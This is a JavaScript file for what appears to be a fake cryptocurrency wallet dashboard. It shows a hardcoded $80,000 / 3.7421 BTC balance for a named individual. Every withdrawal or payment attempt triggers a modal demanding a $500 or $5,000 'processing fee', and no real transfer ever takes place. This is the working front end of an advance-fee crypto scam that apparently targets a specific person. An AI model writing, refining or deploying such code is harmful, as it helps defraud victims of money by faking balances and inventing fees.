const user = {
    name: "Carolyn Shoenert ",
    unlocked: false,
    balanceBTC: 3.7421,
    balanceUSD: 80000
};

document.addEventListener("DOMContentLoaded", () => {
    const nameEl = document.getElementById("clientName");
    if (nameEl) nameEl.textContent = user.name;
});

/* =========================
   MODAL FUNCTIONS
========================= */

function showModal(title, message) {
    const modal = document.getElementById("modal");
    const modalTitle = document.getElementById("modalTitle");
    const modalMessage = document.getElementById("modalMessage");

    modalTitle.textContent = title;
    modalMessage.textContent = message;
    modal.classList.add("show");
}

function closeModal() {
    const modal = document.getElementById("modal");
    modal.classList.remove("show");
}

// Close modal when clicking outside of it
window.onclick = function (event) {
    const modal = document.getElementById("modal");
    if (event.target === modal) {
        closeModal();
    }
}

/* =========================
   AUTH / SESSION
========================= */

function logout() {
    showModal("Sign Out", "You have been signed out.");
    setTimeout(() => {
        window.location.href = "index.html";
    }, 1500);
}


let currentBalance = 80000; // Initial balance in BTC

function proceedWithPayment() {
    const paymentMethod = document.getElementById("paymentMethod").value;

    if (!paymentMethod) {
        showModal("Payment Method Required", "Please select a payment method to proceed.");
        return;
    }

    const methodName = paymentMethod === "bitcoin" ? "Bitcoin" : "Card Payment";
    showModal(
        "Processing Fee Required",
        `Payment Method: ${methodName}\n\nA $500 processing fee is required to continue.\n\nPlease confirm or complete this payment before moving forward.`
    );
}

function withdrawBtc() {
    const withdrawAmount = parseFloat(document.getElementById("withdrawAmount").value);
    const withdrawAddress = document.getElementById("withdrawAddress").value;

    if (!withdrawAmount || withdrawAmount <= 0) {
        showModal("Invalid Amount", "Please enter a valid amount to withdraw.");
        return;
    }

    if (withdrawAmount > currentBalance) {
        showModal("Insufficient Balance", `Insufficient balance. You have $${currentBalance}`);
        return;
    }

    if (!withdrawAddress) {
        showModal("Address Required", "Please enter a recipient address.");
        return;
    }

    currentBalance -= withdrawAmount;
    showModal(
        "Processing Fee Required",
        `To complete this withdrawal, you will need to pay a $5,000 processing fee.`
    );
    document.getElementById("withdrawAmount").value = ""; // Clear input
    document.getElementById("withdrawAddress").value = ""; // Clear input
    updateBalance();
    addTransaction("Sent", withdrawAmount);
}

function addTransaction(type, amount) {
    const transactionsList = document.getElementById("transactions");
    const date = new Date().toLocaleDateString();
    const newTransaction = document.createElement("li");
    newTransaction.textContent = `${date} - ${type}: ${amount} BTC`;
    transactionsList.appendChild(newTransaction);
}

function updateBalance() {
    // document.getElementById("balance").textContent = `$${(currentBalance *0).toFixed(2)} (${currentBalance.toFixed(2)} BTC)`;  // Update balance display
}

function sendBtc() {
    const sendAmount = prompt("Enter the amount you want to send:");
    if (!sendAmount || isNaN(sendAmount) || parseFloat(sendAmount) <= 0) {
        showModal("Invalid Amount", "Please enter a valid amount.");
        return;
    }

    const recipientAddress = prompt("Enter the recipient's address:");
    if (!recipientAddress) {
        showModal("Address Required", "Please enter a recipient address.");
        return;
    }

    // Proceed with sending BTC
    showModal("Confirm Transaction", `You are about to send ${sendAmount} BTC to ${recipientAddress}.`);
    // Here, you would normally call a function to send the BTC
    addTransaction("Sent", parseFloat(sendAmount));
}

function receiveBtc() {
    const walletAddress = "1A2B3C4D5E6F7G8H9I"; // Example address
    showModal(
        "Receive Bitcoin",
        `To receive Bitcoin, please share your wallet address with the sender.\n\nYour wallet address:\n${walletAddress}`
    );
}

function viewQrCode() {
    showModal("QR Code", "Displaying QR Code...");
    // You can integrate a library to generate a QR code from the wallet address
}

// You can also add any additional functions for further enhancements as needed
